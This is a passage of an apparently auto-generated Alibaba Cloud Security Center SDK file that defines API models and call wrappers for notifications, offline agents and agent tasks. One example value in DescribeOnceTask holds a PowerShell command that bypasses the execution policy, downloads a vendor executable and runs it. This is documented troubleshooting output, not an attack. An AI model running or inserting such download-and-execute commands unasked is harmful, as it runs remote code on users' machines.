  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeModuleConfigResponseBody(name='body'),
}

/**
 * @summary Queries the configurations of the asset fingerprint module.
 *
 * @param request DescribeModuleConfigRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeModuleConfigResponse
 */
async function describeModuleConfigWithOptions(runtime: Util.RuntimeOptions): DescribeModuleConfigResponse {
  var req = new OpenApi.OpenApiRequest{};
  var params = new OpenApi.Params{
    action = 'DescribeModuleConfig',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the configurations of the asset fingerprint module.
 *
 * @return DescribeModuleConfigResponse
 */
async function describeModuleConfig(): DescribeModuleConfigResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeModuleConfigWithOptions(runtime);
}

model DescribeMonitorAccountsResponseBody = {
  accountIds?: [ string ](name='AccountIds', description='The IDs of the members.'),
  requestId?: string(name='RequestId', description='The request ID.', example='028CF634-5268-5660-9575-48C9ED6BF880'),
}

model DescribeMonitorAccountsResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeMonitorAccountsResponseBody(name='body'),
}

/**
 * @summary Queries the list of accounts that are added to the multi-account management feature as members.
 *
 * @param request DescribeMonitorAccountsRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeMonitorAccountsResponse
 */
async function describeMonitorAccountsWithOptions(runtime: Util.RuntimeOptions): DescribeMonitorAccountsResponse {
  var req = new OpenApi.OpenApiRequest{};
  var params = new OpenApi.Params{
    action = 'DescribeMonitorAccounts',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the list of accounts that are added to the multi-account management feature as members.
 *
 * @return DescribeMonitorAccountsResponse
 */
async function describeMonitorAccounts(): DescribeMonitorAccountsResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeMonitorAccountsWithOptions(runtime);
}

model DescribeNeedAsyncQueryRequest {
  type?: string(name='Type', description='The type of the query. Valid values:

*   **suspicious**: alerts

This parameter is required.', example='suspicious'),
}

model DescribeNeedAsyncQueryResponseBody = {
  data?: boolean(name='Data', description='Indicates whether the result is returned. Valid values:

*   **true**
*   **false**', example='true'),
  requestId?: string(name='RequestId', description='The request ID.', example='5DFD6277-CC36-57F7-ACE6-F5952XXXXXXXX'),
}

model DescribeNeedAsyncQueryResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeNeedAsyncQueryResponseBody(name='body'),
}

/**
 * @summary Queries whether slow queries need to be optimized.
 *
 * @param request DescribeNeedAsyncQueryRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeNeedAsyncQueryResponse
 */
async function describeNeedAsyncQueryWithOptions(request: DescribeNeedAsyncQueryRequest, runtime: Util.RuntimeOptions): DescribeNeedAsyncQueryResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.type)) {
    query['Type'] = request.type;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeNeedAsyncQuery',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries whether slow queries need to be optimized.
 *
 * @param request DescribeNeedAsyncQueryRequest
 * @return DescribeNeedAsyncQueryResponse
 */
async function describeNeedAsyncQuery(request: DescribeNeedAsyncQueryRequest): DescribeNeedAsyncQueryResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeNeedAsyncQueryWithOptions(request, runtime);
}

model DescribeNoticeConfigRequest {
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='60.191.XX.XX'),
}

model DescribeNoticeConfigResponseBody = {
  noticeConfigList?: [ 
    {
      aliUid?: long(name='AliUid', description='The ID of the user.', example='12123414****'),
      currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='1'),
      project?: string(name='Project', description='The identifier of the notification item. Valid values:

*   **yundun_security_Weekreport**: notification for vulnerabilities
*   **yundun_sas_antiransomware_task**: notification for results of restoration tasks
*   **sas_healthcheck**: notification for baseline checks
*   **sas_suspicious**: notification for alerts generated by Security Center
*   **yundun_aegis_AV_true**: notification for precision defense
*   **yundun_sas_ak_leakage**: notification for AccessKey pair leaks
*   **yundun_sas_config_alert**: notification for configuration assessment
*   **yundun_sas_vul_Emergency**: notification for urgent vulnerabilities
*   **yundun_webguard_event**: notification for web tamper proofing
*   **yundun_sas_cloud_native_firewall**: notification for alerts generated by the container firewall feature
*   **yundun_sas_cloud_native_firewall_Defense**: notification for proactive defense implemented by the container firewall feature
*   **yundun_IP_Blocking**: notification for blocked brute-force attacks initiated from malicious IP addresses
*   **yundun_sas_anti_virus_config**: notification for virus scan
*   **yundun_sas_log**: notification for excess logs
*   **yundun_honeypot_alarm**: notification for alerts generated by the honeypot feature
*   **aliyun_rasp_alarm**: notification for alerts generated by the application security feature
*   **virusScheduleTask**: notification for completion of scheduled virus scans
*   **yundun_anti_Virus**: notification that no security checks are performed
*   **sas_vulnerability**: notification for vulnerabilities
*   **weeklyreport**: notification for weekly reports
*   **agent**: notification that the Security Center agent is offline
*   **bruteforcesuccess**: notification for protection against brute-force attacks
*   **webshell**: notification for webshells
*   **suspicious**: notification for alerts generated by Server Guard
*   **patch**: deprecated
*   **remotelogin**: notification for remote logons
*   **health**: notification for security checks
*   **yundun_sas_cloudsiem_log**: notifications of insufficient threat analysis log capacity

> If the value is **yundun_security_Weekreport**, weekly reports are sent to notify you of unhandled vulnerabilities.', example='sas_suspicious'),
      route?: int32(name='Route', description='The notification method. Valid values:

*   **1**: text message
*   **2**: email
*   **4**: internal message
*   **3**: text message and email
*   **5**: text message and internal message
*   **6**: email and internal message
*   **7**: text message, email, and internal message', example='7'),
      timeLimit?: int32(name='TimeLimit', description='The time period during which Security Center sends notifications. Valid values:

*   **0**: any time
*   **1**: 08:00 to 22:00', example='1'),
    }
  ](name='NoticeConfigList', description='An array that consists of the notification settings.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='D185B7FF-E24C-422D-83D3-C2A25C7A2727'),
}

model DescribeNoticeConfigResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeNoticeConfigResponseBody(name='body'),
}

/**
 * @summary Queries notification settings.
 *
 * @param request DescribeNoticeConfigRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeNoticeConfigResponse
 */
async function describeNoticeConfigWithOptions(request: DescribeNoticeConfigRequest, runtime: Util.RuntimeOptions): DescribeNoticeConfigResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeNoticeConfig',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries notification settings.
 *
 * @param request DescribeNoticeConfigRequest
 * @return DescribeNoticeConfigResponse
 */
async function describeNoticeConfig(request: DescribeNoticeConfigRequest): DescribeNoticeConfigResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeNoticeConfigWithOptions(request, runtime);
}

model DescribeNsasSuspEventTypeRequest {
  containerFieldName?: string(name='ContainerFieldName', description='The name of the container field. Valid values:

*   **clusterId**: the ID of the cluster', example='clusterId'),
  containerFieldValue?: string(name='ContainerFieldValue', description='The value of the container field.', example='ca3108551c83c4d949106e1ab9e1e****'),
  from?: string(name='From', description='The ID of the request source. Set the value to **sas**, which indicates that the request is sent from Security Center.', example='sas'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  multiAccountActionType?: int32(name='MultiAccountActionType', description='The type of the accounts that you want to query. Default value: **0**. Valid values:

*   **0**: the current account.
*   **1**: all accounts.', example='0'),
  name?: string(name='Name', description='The name of the alert type.', example='Unusual Logon'),
  remark?: string(name='Remark', description='The name of the server.', example='testECS'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='180.212.XX.XX'),
  uuids?: string(name='Uuids', description='The UUIDs of servers. Separate multiple UUIDs with commas (,).

> You can call the [DescribeCloudCenterInstances](https://help.aliyun.com/document_detail/141932.html) operation to query the UUIDs of servers.', example='f56406cb-916d-42db-b6f7-2ff79e34****'),
}

model DescribeNsasSuspEventTypeResponseBody = {
  eventTypes?: [ 
    {
      name?: string(name='Name', description='The name of the alert type.', example='Unusual Logon'),
      suspEventCount?: int32(name='SuspEventCount', description='The number of assets for which an alert of the type is generated.', example='22'),
      type?: string(name='Type', description='The alert type.', example='Unusual Logon'),
    }
  ](name='EventTypes', description='An array that consists of the information about the alert type.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='9FBC6E47-7508-58C9-9E76-528E118CB1CC'),
}

model DescribeNsasSuspEventTypeResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeNsasSuspEventTypeResponseBody(name='body'),
}

/**
 * @summary Queries the information about an alert type.
 *
 * @param request DescribeNsasSuspEventTypeRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeNsasSuspEventTypeResponse
 */
async function describeNsasSuspEventTypeWithOptions(request: DescribeNsasSuspEventTypeRequest, runtime: Util.RuntimeOptions): DescribeNsasSuspEventTypeResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.containerFieldName)) {
    query['ContainerFieldName'] = request.containerFieldName;
  }
  if (!Util.isUnset(request.containerFieldValue)) {
    query['ContainerFieldValue'] = request.containerFieldValue;
  }
  if (!Util.isUnset(request.from)) {
    query['From'] = request.from;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.multiAccountActionType)) {
    query['MultiAccountActionType'] = request.multiAccountActionType;
  }
  if (!Util.isUnset(request.name)) {
    query['Name'] = request.name;
  }
  if (!Util.isUnset(request.remark)) {
    query['Remark'] = request.remark;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.uuids)) {
    query['Uuids'] = request.uuids;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeNsasSuspEventType',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the information about an alert type.
 *
 * @param request DescribeNsasSuspEventTypeRequest
 * @return DescribeNsasSuspEventTypeResponse
 */
async function describeNsasSuspEventType(request: DescribeNsasSuspEventTypeRequest): DescribeNsasSuspEventTypeResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeNsasSuspEventTypeWithOptions(request, runtime);
}

model DescribeOfflineMachinesRequest {
  currentPage?: int32(name='CurrentPage', description='The number of the page to return. Default value: **1**.', example='4'),
  os?: string(name='Os', description='The operating system of the server.

>  The value of this parameter is the value of the Values parameter that is returned by calling the [DescribeCriteria](~~DescribeCriteria~~) operation. If the value of the **Name** parameter in the response is **osType**, the value of the **Values** parameter indicates an operating system.', example='linux'),
  pageSize?: int32(name='PageSize', description='The number of entries to return on each page. Default value: **5**.', example='5'),
  regionIdStr?: string(name='RegionIdStr', description='The region in which the server resides.

>  The value of this parameter is the value of the Values parameter that is returned by calling the [DescribeCriteria](~~DescribeCriteria~~) operation. If the value of the **Name** parameter in the response is **regionId**, the value of the **Values** parameter indicates a region ID.', example='cn-hangzhou'),
  regionNo?: string(name='RegionNo', description='The region in which the server resides.

>  The value of this parameter is the value of the Values parameter that is returned by calling the [DescribeCriteria](~~DescribeCriteria~~) operation. If the value of the **Name** parameter in the response is **regionId**, the value of the **Values** parameter indicates a region ID.', example='cn-hangzhou'),
  remark?: string(name='Remark', description='The information about the server that you want to query. The value can be the name or the public IP address of the server.', example='172.20.XX.XX'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='180.113.XX.XX'),
  vendor?: int32(name='Vendor', description='The source of the server. Valid values:

*   **0**: an asset provided by Alibaba Cloud.
*   **1**: a third-party cloud server
*   **2**: a server in a data center
*   **3**, **4**, **5**, and **7**: other cloud asset
*   **8**: a lightweight asset', example='0'),
}

model DescribeOfflineMachinesResponseBody = {
  currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='1'),
  machineList?: [ 
    {
      instanceId?: string(name='InstanceId', description='The ID of the server.', example='sas-bdrvxb4b****'),
      instanceName?: string(name='InstanceName', description='The name of the server.', example='sql-test-001'),
      internetIp?: string(name='InternetIp', description='The public IP address of the server.', example='120.79.XX.XX'),
      intranetIp?: string(name='IntranetIp', description='The private IP address of the server.', example='192.168.XX.XX'),
      machineRegion?: string(name='MachineRegion', description='The region in which the server resides.', example='cn-hangzhou'),
      os?: string(name='Os', description='The operating system of the server. Valid values:

*   **linux**
*   **windows**
*   **windows-2003**', example='linux'),
      regionId?: string(name='RegionId', description='The ID of the region in which the server resides.', example='cn-shanghai'),
      uuid?: string(name='Uuid', description='The UUID of the server.', example='6d5b361f-958d-48a8-a9d2-d6e82c1****'),
      vendor?: int32(name='Vendor', description='The source of the server. Valid values:

*   **0**: an asset provided by Alibaba Cloud.
*   **1**: a third-party cloud server
*   **2**: a server in a data center
*   **3**, **4**, **5**, and **7**: other cloud asset
*   **8**: a lightweight asset', example='0'),
      vendorName?: string(name='VendorName', description='The name of the service provider (SP) for the server.

Valid values:

*   **ALIYUN**: Alibaba Cloud
*   **OUT**: a third-party service provider
*   **IDC**: a data center
*   **TENCENT**: Tencent Cloud
*   **HUAWEICLOUD**: Huawei Cloud
*   **Microsoft**: Microsoft
*   **AWS**: Amazon Web Services (AWS)
*   **TRIPARTITE**: a lightweight server', example='ALIYUN'),
    }
  ](name='MachineList', description='An array that consists of the information about servers.'),
  pageSize?: int32(name='PageSize', description='The number of entries returned per page.', example='5'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='7E0618A9-D5EF-4220-9471-C42B5E92719F'),
  totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='44'),
}

model DescribeOfflineMachinesResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeOfflineMachinesResponseBody(name='body'),
}

/**
 * @summary Queries the information about the servers whose Security Center agent status is Offline.
 *
 * @param request DescribeOfflineMachinesRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeOfflineMachinesResponse
 */
async function describeOfflineMachinesWithOptions(request: DescribeOfflineMachinesRequest, runtime: Util.RuntimeOptions): DescribeOfflineMachinesResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.os)) {
    query['Os'] = request.os;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.regionIdStr)) {
    query['RegionIdStr'] = request.regionIdStr;
  }
  if (!Util.isUnset(request.regionNo)) {
    query['RegionNo'] = request.regionNo;
  }
  if (!Util.isUnset(request.remark)) {
    query['Remark'] = request.remark;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.vendor)) {
    query['Vendor'] = request.vendor;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeOfflineMachines',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the information about the servers whose Security Center agent status is Offline.
 *
 * @param request DescribeOfflineMachinesRequest
 * @return DescribeOfflineMachinesResponse
 */
async function describeOfflineMachines(request: DescribeOfflineMachinesRequest): DescribeOfflineMachinesResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeOfflineMachinesWithOptions(request, runtime);
}

model DescribeOnceTaskRequest {
  currentPage?: int32(name='CurrentPage', description='The number of the page to return. Default value: **1**.', example='1'),
  endTimeQuery?: long(name='EndTimeQuery', description='The timestamp when the root task ends. Unit: milliseconds.', example='1651766520000'),
  pageSize?: int32(name='PageSize', description='The number of entries to return on each page. Default value: **20**.', example='20'),
  rootTaskId?: string(name='RootTaskId', description='The ID of the root task.

> You must specify at least one of the **TaskType** and **RootTaskId** parameters.', example='bb5d657479bba5e1d308b6c9e85c9174'),
  source?: string(name='Source', description='The source of the task. Valid values include the following values:

*   **schedule**: automatic scheduling of Cloud Security Scanner.
*   **console**: one-click detection in the Cloud Security Scanner console.', example='console'),
  startTimeQuery?: long(name='StartTimeQuery', description='The timestamp when the root task starts. Unit: milliseconds.', example='1651737301000'),
  taskId?: string(name='TaskId', description='The ID of the task.', example='d7b2acf8d362742123e4a84e1bf8****'),
  taskType?: string(name='TaskType', description='The type of the task. Valid values:

*   **CLIENT_PROBLEM_CHECK**: a task of the Security Center agent
*   **CLIENT_DEV_OPS**: an O\\\\&M task of Cloud Assistant
*   **ASSET_SECURITY_CHECK**: a task of asset information collection

> You must specify at least one of the **TaskType** and **RootTaskId** parameters.', example='CLIENT_PROBLEM_CHECK'),
}

model DescribeOnceTaskResponseBody = {
  pageInfo?: {
    count?: int32(name='Count', description='The number of entries returned on the current page.', example='2'),
    currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='1'),
    pageSize?: int32(name='PageSize', description='The number of entries returned per page. Default value: **20**.', example='20'),
    totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='100'),
  }(name='PageInfo', description='The pagination information.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='7E0618A9-D5EF-4220-9471-C42B5E92719F'),
  taskManageResponseList?: [ 
    {
      detailData?: string(name='DetailData', description='The execution details of the task. The value of this parameter is in the JSON format.

*   **causeCode**: the returned code for the cause.
*   **causeMsg**: the returned message for the cause.
*   **resCode**: the returned code for troubleshooting.
*   **resMsg**: the returned message for troubleshooting.
*   **problemType**: the type of the issue.
*   **dispatchType**: the task delivery method.
*   **uuid**: the UUID of the server.
*   **instanceId**: the instance ID of the server.
*   **internetIp**: the public IP address of the server.
*   **intranetIp**: the private IP address of the server.
*   **instanceName**: the instance name of the server.
*   **url**: the download URL of the troubleshooting log.', example='[
      {
            "dispatchType": "manual",
            "causeMsg": [],
            "causeCode": [],
            "resCode": [
                  "1003"
            ],
            "resMsg": [
                  "powershell -executionpolicy bypass -c \\\\"(New-Object Net.WebClient).DownloadFile(\\\\"http://aegis.alicdn.com/download/aegis_client_self_check/win32/aegis_checker.exe\\\\", $ExecutionContext.SessionState.Path.GetUnresolvedProviderPathFromPSPath(\\\\".\\\\\\\\\\\\\\\\aegis_checker.exe\\\\"))\\\\"; \\\\"./aegis_checker.exe -b eyJtb2RlIjoxLCJqc3J2X2RvbWFpbiI6W10sImlzc3VlIjoib2ZmbGluZSIsInVwZGF0ZV9kb21haW4iOltdLCJ1dWlkIjoiaW5ldC1lYWUwNDg2Ny0wMDJmLTQyM2QtYWYwMC1jNzJjZDYyOWIyNDgiLCJjbWRfaWR4IjoiNDRjZThiZWI3ZGYyYTQxMjQ1NGM4ZDc5OTE1ODI1MzMifQ==\\\\""
            ],
            "problemType": "offline",
            "uuid": "inet-eae04867-002f-423d-af00-c72cd629****"
      }
]'),
      failCount?: int32(name='FailCount', description='The number of tasks that fail to be executed.', example='2'),
      progress?: string(name='Progress', description='The progress of the task. Unit: percent (%).', example='10%'),
      resultInfo?: string(name='ResultInfo', description='The execution result of the task.', example='successful'),
      successCount?: int32(name='SuccessCount', description='The number of tasks that are executed.', example='7'),
      taskEndTime?: long(name='TaskEndTime', description='The timestamp that indicates the time when the task ends. Unit: milliseconds.', example='1650267989000'),
      taskId?: string(name='TaskId', description='The task ID.', example='e900f528f5a6229bb640ca27cb44c98e'),
      taskName?: string(name='TaskName', description='The name of the task.', example='CLIENT_PROBLEM_CHECK'),
      taskStartTime?: long(name='TaskStartTime', description='The timestamp that indicates the time when the task starts. Unit: milliseconds.', example='1649732012000'),
      taskStatus?: int32(name='TaskStatus', description='The status of the task. Valid values:

*   **1**: The task is started.
*   **2**: The task is complete.
*   **3**: The task fails.
*   **4**: The task times out.', example='1'),
      taskStatusText?: string(name='TaskStatusText', description='The text description of the status for the task. Valid values:

*   **INIT**: The task is pending start.
*   **START**: The task is started.
*   **DISPATCH**: The self-check command is issued.
*   **SUCCESS**: The self-check is complete.
*   **FAIL**: The task fails.
*   **TIMEOUT**: The task times out.', example='INIT'),
      taskType?: string(name='TaskType', description='The type of the task. Valid values:

*   **CLIENT_PROBLEM_CHECK**: a task of the Security Center client
*   **CLIENT_DEV_OPS**: an O\\\\&M task of Cloud Assistant
*   **ASSET_SECURITY_CHECK**: a task for asset information collection', example='CLIENT_PROBLEM_CHECK'),
    }
  ](name='TaskManageResponseList', description='An array that consists of the tasks.'),
}

model DescribeOnceTaskResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeOnceTaskResponseBody(name='body'),
}

/**
 * @summary Queries agent tasks.
 *
 * @param request DescribeOnceTaskRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeOnceTaskResponse
 */
async function describeOnceTaskWithOptions(request: DescribeOnceTaskRequest, runtime: Util.RuntimeOptions): DescribeOnceTaskResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.endTimeQuery)) {
    query['EndTimeQuery'] = request.endTimeQuery;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.rootTaskId)) {
    query['RootTaskId'] = request.rootTaskId;
  }
  if (!Util.isUnset(request.source)) {
    query['Source'] = request.source;
  }
  if (!Util.isUnset(request.startTimeQuery)) {
    query['StartTimeQuery'] = request.startTimeQuery;
  }
  if (!Util.isUnset(request.taskId)) {
    query['TaskId'] = request.taskId;
  }
  if (!Util.isUnset(request.taskType)) {
    query['TaskType'] = request.taskType;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeOnceTask',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries agent tasks.
 *
 * @param request DescribeOnceTaskRequest
 * @return DescribeOnceTaskResponse
 */
async function describeOnceTask(request: DescribeOnceTaskRequest): DescribeOnceTaskResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeOnceTaskWithOptions(request, runtime);
}

model DescribeOnceTaskLeafRecordPageRequest {
  currentPage?: int32(name='CurrentPage', description='The number of the page to return.

This parameter is required.', example='1'),
  endTime?: long(name='EndTime', description='The end timestamp of the sub-task.', example='1668064495000'),
  pageSize?: int32(name='PageSize', description='The number of entries to return on each page. Default value: 20

This parameter is required.', example='20'),
  relateInfo?: boolean(name='RelateInfo', description='Specifies whether extension information is associated.

This parameter is required.', example='true'),
  source?: string(name='Source', description='The source of the request.', example='console_batch'),
  startTime?: long(name='StartTime', description='The start timestamp of the sub-task.', example='1648438617000'),
  statusList?: [ string ](name='StatusList', description='The status information.'),
  taskId?: string(name='TaskId', description='The ID of the sub-task.', example='1471d8ebb96795b41ede090b9758****'),
  taskType?: string(name='TaskType', description='The type of the sub-task. Valid values:

*   **IMAGE_SCAN**: image scan task
*   **IMAGE_REGISTRY_PULL**: image asset synchronization task

This parameter is required.', example='CLIENT_PROBLEM_CHECK'),
}

model DescribeOnceTaskLeafRecordPageResponseBody = {
  onceTasks?: [ 
    {
      endTime?: long(name='EndTime', description='The time when the sub-task ends.', example='1670307567000'),
      finish?: int32(name='Finish', description='Indicates whether the sub-task is complete.

*   **0**: no
*   **1**: yes', example='1'),
      finishCount?: string(name='FinishCount', description='The number of the assets that are scanned.', example='67'),
      progress?: long(name='Progress', description='The progress percentage of the sub-task.', example='75'),
      realRunTime?: long(name='RealRunTime', description='The execution duration of the sub-task.', example='1670307567000'),
      resultInfo?: string(name='ResultInfo', description='The execution result.', example='TASK_NOT_SUPPORT_REGION'),
      startTime?: long(name='StartTime', description='The time when the sub-task starts.', example='1640102400000'),
      status?: string(name='Status', description='The status.', example='0'),
      statusText?: string(name='StatusText', description='The sub-task status. Valid values:

*   **INIT**: The sub-task is not started.
*   **START**: The sub-task is started.
*   **SUCCESS**: The sub-task is complete.
*   **TIMEOUT**: The sub-task timed out.', example='SUCCESS'),
      target?: string(name='Target', description='The objective of the sub-task.', example='238cf050a7270dd6940602e70f1e5a11eeaf4e02035f445b7f613ff5e064****'),
      targetType?: string(name='TargetType', description='The type of the assets that are scanned. Valid values:

*   **IMAGE_REPO**: image repository
*   **IMAGE**: image', example='IMAGE'),
      taskId?: string(name='TaskId', description='The sub-task ID.', example='9fb50f2af8bb67c9fdb684194c83****'),
      taskImageInfo?: {
        appName?: string(name='AppName', description='The name of the application.', example='ack-jenkins-****'),
        clusterId?: string(name='ClusterId', description='The ID of the cluster.', example='a765ba1435e7f9446065370e9a41****'),
        clusterName?: string(name='ClusterName', description='The cluster name.', example='ACK-test-****'),
        costTimeInfo?: string(name='CostTimeInfo', description='The time consumed. The value is in the JSON format. The end time of each item is displayed.

*   **vul**: system vulnerabilities
*   **scaVul**: application vulnerabilities
*   **scaVul**: baseline
*   **binary**: binary
*   **forbiddenPackageInfo**: information about the prohibited package
*   **identificationInfo**: identity authentication
*   **script**: malicious scripts
*   **sensitiveFile**: sensitive files
*   **sensitiveInfo**: AccessKey pair leaks
*   **webshell**: website scripts', example='{"scaVul":"2023-09-04 09:37:21","identificationInfo":"2023-09-04 09:37:30","forbiddenPackageInfo":"2023-09-04 09:37:16","binary":"2023-09-04 09:37:25","baseline":"2023-09-04 09:37:19","sensitiveFile":"2023-09-04 09:38:34","vul":"2023-09-04 09:37:31","webshell":"2023-09-04 09:38:27","sensitiveInfo":"2023-09-04 09:37:16","script":"2023-09-04 09:39:44"}'),
        digest?: string(name='Digest', description='The digest of the image.', example='9e0dc29d872d2e386cc5c0c92b529a84e3acfade16f5cb1d054a2ee3c99****'),
        image?: string(name='Image', description='The image of the container.', example='***s.com/sas_test/baseli***'),
        nodeInstanceId?: string(name='NodeInstanceId', description='The instance ID of the node.', example='i-0xi5mxvtmfw9****'),
        nodeIp?: string(name='NodeIp', description='The IP address of the node.', example='172.18.XXX.XXX'),
        nodeName?: string(name='NodeName', description='The name of the node.', example='pztest****'),
        pod?: string(name='Pod', description='The pod of the image.', example='expoit-law-****'),
        regionId?: string(name='RegionId', description='The region ID of the server image.', example='cn-hangzhou'),
        registryType?: string(name='RegistryType', description='The type of the image repository. Valid values:

*   **acr**
*   **harbor**
*   **quay**
*   **CI/CD**', example='acr'),
        repoId?: string(name='RepoId', description='The ID of the image repository.', example='crr-r88w2vryp8m****'),
        repoName?: string(name='RepoName', description='The name of the image repository.', example='testyyy'),
        repoNamespace?: string(name='RepoNamespace', description='The name of the namespace to which the image repository belongs.', example='bitn***'),
        repoRegionId?: string(name='RepoRegionId', description='The region ID of the image repository.', example='cn-hangzhou'),
        tag?: string(name='Tag', description='The tag that is added to the image.', example='v1.20-002-a2*****'),
      }(name='TaskImageInfo', description='The information about the image scan.'),
      taskName?: string(name='TaskName', description='The name of the sub-task.', example='IMAGE_SCAN'),
      taskType?: string(name='TaskType', description='The type of the sub-task.', example='IMAGE_SCAN'),
      totalCount?: string(name='TotalCount', description='The total number of entries returned.', example='30'),
    }
  ](name='OnceTasks', description='The details of tasks.'),
  pageInfo?: {
    count?: int32(name='Count', description='The number of entries returned on the current page.', example='6'),
